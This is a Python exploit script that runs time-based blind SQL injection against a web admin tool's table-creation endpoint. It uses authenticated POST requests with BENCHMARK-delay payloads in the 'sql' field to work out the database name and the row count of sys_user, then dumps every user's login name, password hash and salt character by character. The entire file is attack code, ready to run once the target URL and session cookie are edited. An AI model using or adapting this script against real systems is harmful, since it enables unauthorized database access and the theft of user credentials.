import requests
import time
import random
import string


TARGET_URL = "http://127.0.0.1/tool/gen/createTable"     #change ip or domain
COOKIES = {"JSESSIONID": "56ed6eba-ef74-447d-a5ba-cac1bbe891c3"}     #change COOKIES after logging in
DELAY_TIME = 2
BENCHMARK_TIME = 30000000      #if you can't get the right result, please change BENCHMARK_TIME and DELAY_TIME(3 or more)
TABLE_NAME = "sys_user"
TARGET_FIELDS = ["login_name", "password", "salt"]

def generate_random_table():
    return f"x{''.join(random.choices('23456789abcdef', k=6))}"

def check_current_db_length(num):
    random_table = generate_random_table()
    payload = f"CREATE TABLE {random_table} AS SELECT(IF(LENGTH(DATABASE())={num},BENCHMARK({BENCHMARK_TIME},MD5(1)),0))  AS RESULT;"
    start_time = time.time()
    response = requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
    return time.time() - start_time >= DELAY_TIME

def get_database_name(db_length):
    print(f"[!] Getting database name with length: {db_length}")
    db_name = ""
    for pos in range(1, db_length + 1):
        for ascii_val in range(32, 127):
            random_table = generate_random_table()
            payload = f"CREATE TABLE {random_table} AS SELECT(IF(MID(DATABASE(),{pos},1)='{chr(ascii_val)}',BENCHMARK({BENCHMARK_TIME},MD5(1)),0)) AS RESULT;"
            start_time = time.time()
            response = requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
            if time.time() - start_time >= DELAY_TIME:
                db_name += chr(ascii_val)
                print(f"[+] Position {pos}: {chr(ascii_val)}")
                break
        else:
            print(f"[-] Failed to find character at position {pos}")
            return None
    return db_name

def check_table_exists(table_name):
    print(f"[!] Checking if table '{table_name}' exists...")
    random_table = generate_random_table()
    payload = f"CREATE TABLE {random_table} AS SELECT(IF((SELECT(COUNT(*))FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() && TABLE_NAME='{table_name}')=1,BENCHMARK({BENCHMARK_TIME},MD5(1)),0)) AS RESULT;"
    start_time = time.time()
    response = requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
    table_exists = time.time() - start_time >= DELAY_TIME
    return table_exists

def get_table_row_count(table_name):
    print(f"[!] Counting rows in table '{table_name}'...")
    for row_guess in range(1, 1000):
        random_table = generate_random_table()
        payload = f"CREATE TABLE {random_table} AS SELECT(IF((SELECT(COUNT(*))FROM {table_name})={row_guess},BENCHMARK({BENCHMARK_TIME}, MD5(1)), 0)) AS RESULT;"
        start_time = time.time()
        requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
        if time.time() - start_time >= DELAY_TIME:
            print(f"[+] Table '{table_name}' has {row_guess} rows.")
            return row_guess
    print(f"[-] Failed to count rows in table '{table_name}'")
    return None

def dump_field_data(table_name, field_name, row_count):
    print(f"[!] Dumping data from `{table_name}`.`{field_name}`...")
    field_data = []
    
    for row_idx in range(row_count):
        row_value = ""
        
        field_length = 0
        print(f"[+] Detecting length for row {row_idx}...")
        
        for len_guess in range(1, 50):
            random_table = generate_random_table()
            payload = f"CREATE TABLE {random_table} AS SELECT(IF((SELECT(LENGTH({field_name}))FROM({table_name})LIMIT {row_idx},1)={len_guess},BENCHMARK({BENCHMARK_TIME},MD5(1)),0))AS RESULT;"
            start_time = time.time()
            requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
            
            if time.time() - start_time >= DELAY_TIME:
                field_length = len_guess
                print(f"    [+] Possible length: {len_guess}")
        
        print(f"[+] Field `{field_name}` row {row_idx} final length: {field_length}")
        
        for pos in range(1, field_length + 1):
            char_found = False
            for ascii_val in range(32, 127):
                char = chr(ascii_val)
                random_table = generate_random_table()
                payload = f"CREATE TABLE {random_table} AS SELECT(IF((SELECT(MID({field_name},{pos},1))FROM({table_name})LIMIT {row_idx},1)='{char}',BENCHMARK({BENCHMARK_TIME},MD5(1)),0)) AS RESULT;"
                start_time = time.time()
                response = requests.post(TARGET_URL, data={"sql": payload}, cookies=COOKIES)
                if time.time() - start_time >= DELAY_TIME:
                    row_value += char
                    print(f"    [+] Pos {pos}: '{char}'")
                    char_found = True
                    break
            if not char_found:
                break
        field_data.append(row_value if row_value else "NULL")
    return field_data

def print_results_table(results):
    print("\n[+] Data Dump Results:")
    print("+---------------------+----------------------+----------------------+")
    print("| %-20s | %-20s | %-20s |" % tuple(TARGET_FIELDS))
    print("+---------------------+----------------------+----------------------+")
    for row in zip(*results):
        print("| %-20s | %-20s | %-20s |" % row)
    print("+---------------------+----------------------+----------------------+")

if __name__ == "__main__":
    print("[!] Checking database name length...")
    db_length = 0
    for i in range(1, 25):
        if check_current_db_length(i):
            db_length = i
            print(f"[+] Database name length: {db_length}")
            break
        print(f"[-] Trying length: {i}")
    else:
        print("[-] Failed to determine database name length")
        exit(1)
    
    database_name = get_database_name(db_length)
    if not database_name:
        print("[-] Failed to retrieve database name")
        exit(1)
    print(f"[+] Database name: {database_name}")
    
    if not check_table_exists(TABLE_NAME):
        print(f"[-] Table '{TABLE_NAME}' does not exist!")
        exit(1)
    print(f"[+] Table '{TABLE_NAME}' exists!")
    
    row_count = get_table_row_count(TABLE_NAME)
    if not row_count:
        print(f"[-] Failed to get row count for table '{TABLE_NAME}'")
        exit(1)
    
    all_fields_data = []
    for field in TARGET_FIELDS:
        field_data = dump_field_data(TABLE_NAME, field, row_count)
        all_fields_data.append(field_data)
    
    print_results_table(all_fields_data)
